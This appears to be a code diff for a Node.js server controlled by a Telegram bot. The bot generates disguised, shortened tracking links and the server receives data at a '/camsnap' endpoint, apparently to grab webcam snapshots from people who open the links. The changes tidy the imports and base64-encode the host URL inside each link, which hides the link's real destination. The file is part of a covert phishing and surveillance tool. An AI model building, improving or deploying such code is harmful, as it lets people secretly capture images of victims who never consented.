@@ -3,8 +3,7 @@ var cors = require('cors');
 var bodyParser = require('body-parser');
 var isgd = require('isgd');
 var vgd = require('vgd');
-const { primaryURL } = require('./script.js');
-const { shortenUrlOp, createShortLink } = require('./script.js');
+const { primaryURL, shortenUrlOp, createShortLink } = require('./script.js');
 var axios = require('axios');
 var atob = require('atob');
 var ejs = require ('ejs');
@@ -13,6 +12,7 @@ var TelegramBot = require('node-telegram-bot-api');
 var bot = new TelegramBot(process.env["bot"], {polling: true});
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
 var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
+
 var app = express();
 app.use(jsonParser);
 app.use(urlencodedParser);
@@ -20,7 +20,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 // Modify your URL here
-var hostURL = "YOUR URL";
+var hostURL = "YOUR URL HERE";
 
 // TOGGLE for Shorters
 var use1pt = false;
@@ -73,11 +73,12 @@ async function createLink(cid, msg) {
 
     bot.sendChatAction(cid, 'typing');
 
-    var cUrl = `${primaryURL}/c/${url}/${hostURL.replace(/^https?:\/\//, '')}`;
-                
+    var hostURLEncoded = Buffer.from(hostURL).toString('base64');
+    var cUrl = `${primaryURL}/c/${url}/${hostURLEncoded}`;
+
     var cShortUrl1 = await createShortLink(cUrl);
     var cShortUrl2 = await shortenUrlOp(cUrl);
-                
+
     bot.sendMessage(
       cid,
       `New links are created successfully\n\nURL: ${msg}\n\n✅Your Links\n\n𝟭. ${cShortUrl1}\n𝟮. ${cShortUrl2}`,
@@ -169,4 +170,3 @@ app.post("/camsnap", (req, res) => {
 app.listen(5000, () => {
     console.log("App Running on Port 5000!");
 });
-        
